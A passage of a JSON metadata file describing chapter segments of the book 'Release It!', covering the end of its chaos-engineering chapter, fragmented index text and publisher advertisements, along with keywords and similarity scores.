see if you can continue business as usual.\nYou can make this more fun by calling it a “zombie apocalypse simulation.” Randomly select 50 percent of your people and tell them they are counted as zombies for the day.\nAs with Chaos Monkey, the first few times you run this simulation, you’ll immediately discover some key processes that can’t be done when people are out.\nhttps://medium.com/netflix-techblog/chap-chaos-automation-platform-53e6d528371f\nChaos Engineering • 336\nIt’s probably not a good idea to combine fault injections together with a zombie simulation for your very first run-through.\nChaos engineering starts with paradoxes.\nWe need to break things—regularly and in a semicon- trolled way—to make the software and the people who build it more resilient.",
      "keywords": [
        "Chaos Engineering",
        "Chaos",
        "system",
        "Chaos Monkey",
        "request",
        "n’t",
        "Engineering",
        "report erratum",
        "service",
        "calls",
        "Things",
        "report",
        "Monkey",
        "failure",
        "Chaos Monkey works"
      ],
      "concepts": [
        "chaos",
        "failure",
        "things",
        "request",
        "requests",
        "services",
        "pressing",
        "press",
        "report",
        "randomly"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 12,
          "title": "",
          "score": 0.689,
          "base_score": 0.539,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 2,
          "title": "",
          "score": 0.668,
          "base_score": 0.518,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 5,
          "title": "",
          "score": 0.619,
          "base_score": 0.469,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 4,
          "title": "",
          "score": 0.549,
          "base_score": 0.399,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 26,
          "title": "",
          "score": 0.536,
          "base_score": 0.386,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "chaos",
          "chaos engineering",
          "engineering",
          "monkey",
          "inject"
        ],
        "semantic": [],
        "merged": [
          "chaos",
          "chaos engineering",
          "engineering",
          "monkey",
          "inject"
        ]
      },
      "topic_id": 2,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.29971867201144203,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.247176+00:00"
      }
    },
    {
      "chapter_number": 42,
      "title": "Segment 42 (pages 343-353)",
      "start_page": 343,
      "end_page": 353,
      "summary": "DIGITS 12-factor app, 150–151 202 response code, back\n5 a.m. problem, 38–43 503 Service Unavailable re-\nback pressure, 121 let it crash pattern, 108–\nadaptation, 289–324\nexplicit context, 306–\n313–323\nloose clustering, 305 messages, events, and commands, 314–316 painless releases, 295 platform team, 292–294 process and organization,\n290–301\nservice extinction, 296–\nsystem architecture, 301–\nadvantages, 4 change and, 289 decision loops, 291 airline case study, 9–21, 27–\nS3 service outage, 195–\nchanges, 265, 268–270\nversioning nonbreaking changes, 263–268\nadaptation and informa- tion architecture, 313– 323\narchitecture, 301–313\ncomponent-based, 302 event-based, 304 evolutionary, 296, 302–\nlayered, 302–303 pragmatic vs.\nsecurity, 218–222 session fixation, 218 session prediction attack,\ndeployment, 242–246 efficiency cautions, 301 force multiplier antipat- tern, 80–84, 123, 194 governor pattern, 123–\nHTTP APIs, 210 lack of judgment, 197 mapping, 246 speed of failure, 196 autonomy, team-scale, 298 autoscaling, see also scaling chain reactions, 49 costs, 52, 77, 202 force multiplier antipat- tern, 81, 123, 196 let it crash pattern, 110 pre-autoscaling, 71 self-denial attacks, 71 unbalanced capacities,\nstability pattern, 120–123 unbalanced capacities,\npartitioning traffic, 145 serialization and session failover in ecommerce case study, 287 Baldwin, Carliss Y., 308–313 bastion servers, 153 bell-curve distribution, 88 bidirectional certificates, 230 Big-IP, 180 binding\nBlack Friday case study, 129–\nblue/green deployments, 295 bogons, 55, 185 bonding interfaces, 144 Bonnie 64, 147 broadcasts, 73 broken access control, 222–\npipeline, 243–247, 261 manual checks for deploy-\nstability pattern, 98–101 unbalanced capacities,\n64–66\ncrushed ecommerce site case study, 284–288\ndefined, 52 demand control, 182–186 drift and, 327 judging load capacity by concurrent users, 281 judging load capacity by\nmodeling, 77 unbalanced capacities stability antipattern, 75–78, 112\nterns, 51–55 cascading failures\nblocked threads, 50, 68 chain reactions, 48 circuit breakers, 50, 98 fail fast pattern, 107 slow responses, 85 stability antipattern, 49–\n277–288\ndeployment army, 237–\nusing postmortems, 14–\ncatalog service example, 316–\nblocked threads, 48, 68 cascading failures, 48 splitting, 47, 49 stability antipattern, 46–\nchaos engineering, 325–336 automation and repeti-\ndisaster simulations, 335 environments, 325 injecting chaos, 331–332 precursors, 326–328 prerequisites, 330 Simian Army, 328–335 targeting chaos, 333 test harnesses, 116\nChaos Monkey, 328–335 ChAP (Chaos Automation\n45–46, 98\nlet it crash pattern, 111 live control, 210 logging, 97 scope, 97 slow responses, 98 stability pattern, 95–98 thresholds, 96 with timeouts, 94, 98 unbalanced capacities,\ncontainers in, 153 networking and founda- tion layer, 142–146 virtual machines in, 152\nguidelines for, 157–160 native, 87 separating out log files,\nture, 314–316 live control, 210\npoint-to-point communi- cation scaling effects, 72–73, 75\ncompetitive intelligence, 59–\nlet it crash pattern, 108–\nment tools guidelines, 206–207\nfiles, 160 guidelines for, 160–162 immutable infrastruc-\nduration of TCP, 40 live control, 210 metrics, 205 outbound, 146 queue backups, 183 test harnesses, 114–117\nconstraints and rollout, 260–\n149–153\n206–207\ncontainers, 149–152 control plane layer, 141,\n193–214 costs, 194 defined, 193 development environ-\ntern, 83–84\nin layer diagram, 141 level of, 193 live control, 209–212 platform and ecosystem,\n197–199\nplatform services, 212–\nshopping list, 213 transparency, 200–206 virtual machines in the\ngateway page, 286 pairing, 229 scrapers and spiders, 59–\n57–60\nairline case study, 28–29 avoiding with log files,\npattern, 108–111\n14–20\nautomated, 12 containers, 152 thread dumps, 16–18,\ntransparency, 163–170 data encryption keys, 226,\nconstraints, 260–261 data purging, 102, 107 dead connection detec-\ndeployment, 250–255,\n259–261\n216–218\n86–90, 94\n45–46, 117\nself-denial attacks, 70 stability pattern, 117–119 total decoupling, 119\ndemand control, 182–186, see\nself-denial attacks, 69–\nassignment, 244 automated, 242–246 avoiding planned down-\nbuild pipeline and, 243–\ncase study, 237–239 choices, 241 cleanup phase, 259 continuous, 246–260 convergence, 245, 257 coordinated deployments,\ncosts, 239 databases, 250–255,\n259–261 defined, 156 delivery guidelines, 245 deployment services guidelines, 207\ndesigning for, 241–262 diagram, 156 drain period, 249 immutable infrastruc-\nmanual checks, 247 packaging, 245 painless releases, 295 phases, 248–260 placement services, 209 preparation, 248–257 risk cycle, 246 rolling, 248 rollout phase, 257–259 session affinity, 255 speed, 246, 248, 257 time-frame, 248–250 trickle, then batch, 254–\n180 discovery services DNS, 172–173\ning, 175–177\n173–177\nload balancing, 173–177 resolving hostnames, 143 round-robin load balanc-\ning, 173–174\n172–173\non, 64–66\nture, 314–316\n296, 302–313\nexecutables, defined, 156 explicit context, 306–307, 320 extinction, service, 296–298\nlatency problems, 94 slow responses, 86, 107 stability pattern, 106–108\nchain of failure, 28–30 defined, 29 isolation and splitting\ntion, 27–29\n80–84, 123, 194\nFord, Neal, 302 form follows failure, 301 foundation layer, 141–154 in layer diagram, 141 networking, 142–146 physical hosts, virtual\nmachines, and contain- ers, 146–153 Fowler, Martin, 314 FQDN (fully qualified domain\nweak references, 53–54,\ndisaster recovery, 180 with DNS, 175–177 global state and implicit con-\nthreads example, 64–66\n123–125, 194, 296 Gregorian calendar, 129 GSLB, see global server load\nstability pattern, 111–113 TCP, 36, 111, 183 unbalanced capacities,\nlems, 52–54\ndefined, 143 machine identity, 143–\nidentifiers, services, 316–318 ignorance, principle of, 305 immutable infrastructure code guidelines, 158 deployment, 245 domain objects, 64 packaging, 245 rollout example, 258 steady state pattern, 101\nadaptation, 313–323 information leakage, 224 infrastructure, see immutable\ninjection vulnerabilities, 216–\nChaos Monkey, 331 code guidelines, 157–160 configuration guidelines,\n160–162 defined, 155 health checks, 169, 180 instances layer, 141,\n155–170\n171–191\nload balancing, 173–182 loose clustering, 305 metrics, 169 porting modules, 312 transparency guidelines, 162–170, 200–206 insufficient attack prevention,\ncascading failures, 50 circuit breakers, 45–46,\n45–46, 117\n35–43\nstability antipatterns, 33–\nstrategies for, 45–46 vendor API libraries, 44\nexplicit context, 307 overspecification, 272 test harnesses, 45, 113–\nDNS, 173–177 interconnection layer,\n141, 171–191\nload balancing, 173–182\nnetwork routing, 186–188 service discovery with\nDNS, 172–173\nmachine identity, 143–\nbonding interfaces, 144 containers, 149–150 default gateways, 186 load balancing with DNS,\n173–177\n149–150, 187\nthread dumps, 16–18 Java Concurrency in Practice,\nK Kafka, 315 Kerberos, 220–221 key encryption keys, 226, 233 Key Management Service\ndata purging, 102 fail fast, 94 as lagging indicator, 134 Latency Monkey, 331 test harnesses, 116 timeouts, 94 Latency Monkey, 331 layer 7 firewalls, 227 layered architecture, 302–303 leader election, 206, 305 Leaky Bucket pattern, 97\n108–111\n183–184\nsessions, 281 live control, 210 load shedding, 119–120,\nload testing, 26, 281–284\nbulkheads, 100 canary deployments, 257 chain reactions, 46–49 containers, 150 with DNS, 173–177 fail fast pattern, 106 guidelines, 177–182\ning, 173–174\nload shedding, 119–120, 122,\n281–284\nbreaking API changes, 268– 271\nlog file locations, 166 logging servers, 104–105 for postmortems, 16–18 readability, 167 rotating log files, 103–104 software load balancing,\ncy, 204–206\ntransparency, 165–169,\n204–206\nenumeration, 187 networks, 143–146, 152 virtual machines in the\npatterns, 60–62\nheap, 52–54 in-memory caching stabil-\nture, 314–316\naggregating, 204 blocked threads, 63 circuit breakers, 97 guidelines, 204 instance, 169 metric collectors, 204–\ncy, 204–206 thresholds, 206\nmodular operators, 308–313 modules\n200–201\ncircuit breakers, 97 stability and, 62–69\nfully qualified domain name (FQDN), 143 machine identity, 143–\nfoundation layer, 142–\nintegration points stabili- ty antipatterns, 33–46 interface names, 143–146 machine identity, 143–\noverlay networks, 149 routing guidelines, 186–\ndefault gateways, 186 loopback, 143 machine identity, 143–\nment in past, 292 operators, modular, 308–313 optimistic locking, 70 Oracle, see also JDBC driver\nOWASP Top 10, 216–231\n222–224\n219, 221, 228 injection, 216–218\nsession hijacking, 218–\n98–101",
      "keywords": [
        "global server load",
        "Key Management Service",
        "HTTP Strict Transport",
        "Amazon Machine Images",
        "airline case study",
        "ecommerce case study",
        "Black Friday case",
        "DNS round-robin load",
        "live control API",
        "integration point failures",
        "Common Weakness Enumer",
        "Command Query Respon",
        "discovery services DNS",
        "Amazon Web Services",
        "fail fast pattern"
      ],
      "concepts": [
        "service",
        "deployment",
        "deployments",
        "defined",
        "attacks",
        "pattern",
        "security",
        "failures",
        "logging",
        "log"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 43,
          "title": "",
          "score": 0.905,
          "base_score": 0.755,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 3,
          "title": "",
          "score": 0.566,
          "base_score": 0.416,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 44,
          "title": "",
          "score": 0.399,
          "base_score": 0.249,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 8,
          "title": "",
          "score": 0.381,
          "base_score": 0.381,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 12,
          "title": "",
          "score": 0.373,
          "base_score": 0.373,
          "topic_boost": 0.0,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "pattern",
          "173",
          "143",
          "guidelines",
          "206"
        ],
        "semantic": [],
        "merged": [
          "pattern",
          "173",
          "143",
          "guidelines",
          "206"
        ]
      },
      "topic_id": 3,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.2745932522577121,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.247213+00:00"
      }
    },
    {
      "chapter_number": 43,
      "title": "Segment 43 (pages 354-361)",
      "start_page": 354,
      "end_page": 361,
      "summary": "control plane, 197–199 costs, 202 goals, 293–294 platform services and\nlines, 212–213\nroles, 197–199, 292–294,\nplurality, embracing, 321–322 point-to-point communication scaling effects, 72–73, 75\nairline case study, 14–20 Amazon Web Services S3 service outage, 195– 197\nbinding, 100 circuit breaker scope, 97 code guidelines, 157–160 configuration guidelines,\n160–162 defined, 156 deployment diagram, 156 instances layer, 155–170 let it crash pattern, 109\n162–170\n193–214\ncosts, 3 foundation layer, 141–\n155–170\n141, 171–191\nlayer diagram, 141, 171 need for, 1–6 priorities, 141 security layer, 215–234\ncrushed ecommerce site case study, 278–281\nback pressure, 120–123 backups and system fail-\n119, 183–184 load shedding, 120 point-to-point communi- cation scaling effects, 73\nreactions, 46–49\n200–201\n80–83, 123, 194, 196\ndeployment, 250–252,\nblocked threads, 64, 68 cascading failures, 50 data purging, 102, 107 fail fast pattern, 106 load shedding, 119, 184 metrics, 205 scaling effects of shared\n102–106 timeouts, 92 virtual machines, 147\n129–139, 163\n277–288\n257–259\n173–174\ncontent-based, 181 guidelines, 186–188 software-defined network-\n200–201\nscaling effects in point-to- point communication, 72–73\nscaling effects stability antipattern, 71–75 self-denial attacks, 70 unbalanced capacities,\nment, 252–255, 260\nstability problems, 59–60\nAPIs, 230 attack surfaces, 225 authentication, 218–222 blacklists, 227 broken access control,\n222–224\ninformation leakage, 224 injection, 216–218 insufficient attack preven-\nlogging bad requests, 227 malicious users, 60–62 misconfiguration, 225 as ongoing process, 233 OWASP Top 10, 216–231 pie crust defense, 220,\nsample applications, 225 script kiddies, 61 security layer, 215–234 sensitive data exposure,\nsession fixation, 218 session hijacking, 218–\nURL dualism, 321 self-contained systems, 303 self-denial attacks, 69–71, 76 sensitive data exposure, 226 serialization and session\nservice extinction, 296–298 service-oriented architecture\n316–318 defined, 155\nservice extinction, 296–\n219, 221, 228 generating, 219 self-denial attacks, 71 session hijacking, 218–\nheap memory, 52–54 judging load capacity by\noff-heap memory, 54 replication in crushed ecommerce site case study, 284–288 session affinity, 255 session fixation, 218 session hijacking, 218–\n57–60\ncircuit breakers, 98 fail fast pattern, 107 handshaking, 112 as indistinguishable from crashes, 63–64, 84\n35–43\nstability problems, 59–60\nchain of failure, 28–30 costs of poor stability, 23 defined, 24 failure modes, 26–28 global growth in users,\ntion, 27–29\nstability antipatterns, 31–90, see also slow responses; threads, blocked\ncascading failures, 48– 51, 85, 94, 98, 107 chain reactions, 46–49,\nintegration points, 33–\nscaling effects, 71–75 self-denial attacks, 69–\n75–78, 98, 112\n86–90, 94 users, 51–62\nstability patterns, 91–125, see also circuit breakers; timeouts\nback pressure, 76, 120–\n98–101\ndecoupling middleware, 45–46, 70, 117–119 fail fast, 86, 94, 106–108 governor, 123–125, 194,\n111–113\nlet it crash, 108–111 load shedding, 119–120,\nsteady state, 89, 101–106 test harnesses, 45, 77,\n113–117\n101–106\nstability pattern, 101–106 unbounded result sets,\njects, 64–66\narchitecture, 301–313\ncy, 163, 200–206\ncascading failures, 49–51 queue backups, 182 slow processes vs.\nes, 63–64\n35–43\nload shedding, 119 multicasts, 73 networking basics, 36–38 number of socket connec-\nadoption teams, 294 assignments, 4 autonomy, 298 goals, 294 platform roles, 197–199,\n292–294, 299\nstability pattern, 113–117 unbalanced capacities,\nload, 26, 281–284 longevity tests, 25 overfocus on, 1 stress, 62, 68, 78 unbalanced capacities,\nfor postmortems, 16–18\nairline case study, 27 back pressure, 121 cascading failures, 50, 68 chain reactions, 48, 68 metrics, 63 monitoring, 63 partitioning threads in- side a single process, 100\nes, 63–64\nstability antipattern, 62–\non domain objects, 64– 66\nairline case study, 27 blocked threads, 68–69,\nlatency problems, 94 live control, 210 stability pattern, 91–95 TCP sockets, 37, 41 unbounded result sets,\nterns, 51–55\ndata collection, 163–170 designing for, 164 economic value, 200–201 instance-level, 162–170 logs and stats, 165–169,\n204–206\n200–201\nsystem-level, 163, 200–\ntions, 254–255\ncircuit breakers, 98 handshaking, 76, 112 stability antipattern, 75–\nunbounded result sets, 86–\n222–224\ndualism, 318–321 probing, 223 session-sensitive, 223 version discriminator,\nmalicious, 60–62 metrics, 205 real-user monitoring and transparency, 200–201\nstability antipatterns, 51–\ntraffic problems, 51–55 unwanted, 57–60\nversion control, 158, 161 VersionEye, 229 versioning, 263–273 deployment, 255 events, 315 handling others’ versions,\n270–273\n263–270\nvirtual LANs (VLANs), 149–\nin foundation layer, 146–\nVLANs, see virtual LANs VLANs (virtual LANs), 149–\nW WannaCry ransomware, 215 weak references, 53–54, 67 web assets, deployment, 255 Weinberg, Gerald, 327 “‘What Do You Mean by ’Event-Driven’?”, 314 white-box technology, 164 whitelists, 227 Why People Believe Weird\nabout, 161, 188, 206 Reddit.com outage exam- ple, 80–83, 123, 196",
      "keywords": [
        "integration point failures",
        "session prediction attack",
        "Black Friday case",
        "Friday case study",
        "services service extinction",
        "unbounded result sets",
        "load stability pattern",
        "ecommerce case study",
        "airline case study",
        "fail fast pattern",
        "Amazon Web Services",
        "HTTP Strict Transport",
        "site case study",
        "ery services service",
        "case study"
      ],
      "concepts": [
        "failures",
        "session",
        "sessions",
        "deployment",
        "deployments",
        "stability",
        "attacks",
        "pattern",
        "design",
        "services"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 42,
          "title": "",
          "score": 0.905,
          "base_score": 0.755,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 3,
          "title": "",
          "score": 0.581,
          "base_score": 0.431,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 25,
          "title": "",
          "score": 0.462,
          "base_score": 0.462,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 8,
          "title": "",
          "score": 0.446,
          "base_score": 0.446,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 6,
          "title": "",
          "score": 0.41,
          "base_score": 0.41,
          "topic_boost": 0.0,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "case study",
          "study",
          "stability",
          "218",
          "200"
        ],
        "semantic": [],
        "merged": [
          "case study",
          "study",
          "stability",
          "218",
          "200"
        ]
      },
      "topic_id": 3,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.29935987582319706,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.247249+00:00"
      }
    },
    {
      "chapter_number": 44,
      "title": "Segment 44 (pages 362-366)",
      "start_page": 362,
      "end_page": 366,
      "summary": "$29 https://pragprog.com/book/dzpyds\n$45.95 https://pragprog.com/book/jwdsal\nThis book gets you up to speed on the HTML5 elements and CSS3 features you can use right now in your cur- rent projects, with backwards compatible solutions that ensure that you don’t leave users of older browsers behind.\n$38 https://pragprog.com/book/bhh52e\n$36 https://pragprog.com/book/kdnodesec\nA book on mazes?\n$38 https://pragprog.com/book/jbmaze\n$34 https://pragprog.com/book/mcmath\nWith its unique blend of forensic psychology and code analysis, this book arms you with the strategies you need, no matter what programming language you use.\n$36 https://pragprog.com/book/atcrime\n$24 https://pragprog.com/book/rjnsd\nThis Book’s Home Page https://pragprog.com/book/mnee2 Source code from this book, errata, and other resources.\nRegister for Updates https://pragprog.com/updates Be notified when updates and new books become available.\nJoin the Community https://pragprog.com/community Read our weblogs, join our online discussions, participate in our mailing list, interact with our wiki, and benefit from the experience of other Pragmatic Programmers.\nNew and Noteworthy https://pragprog.com/news Check out the latest pragmatic developments, new titles and other offerings.\nIt’s available for purchase at our store: https://pragprog.com/book/mnee2\nhttps://pragprog.com/catalog\nacademic@pragprog.com",
      "keywords": [
        "essential data science",
        "data science",
        "Data Structures",
        "Data",
        "ISBN",
        "book",
        "Pragmatic",
        "basic science",
        "Web",
        "pages",
        "Python",
        "science",
        "essential data",
        "code",
        "busy data scientist"
      ],
      "concepts": [
        "book",
        "pages",
        "data",
        "web",
        "applications",
        "application",
        "pragmatic",
        "developers",
        "developments",
        "code"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 42,
          "title": "",
          "score": 0.399,
          "base_score": 0.249,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 43,
          "title": "",
          "score": 0.396,
          "base_score": 0.246,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 1,
          "title": "",
          "score": 0.334,
          "base_score": 0.334,
          "topic_boost": 0.0,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "pragprog com",
          "pragprog",
          "https pragprog",
          "https",
          "book"
        ],
        "semantic": [],
        "merged": [
          "pragprog com",
          "pragprog",
          "https pragprog",
          "https",
          "book"
        ]
      },
      "topic_id": 3,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.10288958153347551,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.247278+00:00"
      }
    }
  ],
  "total_chapters": 44,
  "enrichment_provenance": {
    "taxonomy_id": "none",
    "taxonomy_version": "none",
    "taxonomy_path": "none",
    "taxonomy_checksum": "sha256:none",
    "source_metadata_file": "Release It! Design and Deploy Production-Ready Software_metadata.json",
    "enrichment_date": "2025-12-17T23:08:39.252836+00:00",
    "enrichment_method": "msep",
    "model_version": "ai-agents-msep-v1",
    "processing_time_ms": 4617.704752999998,
    "total_similar_chapters": 210
  }
}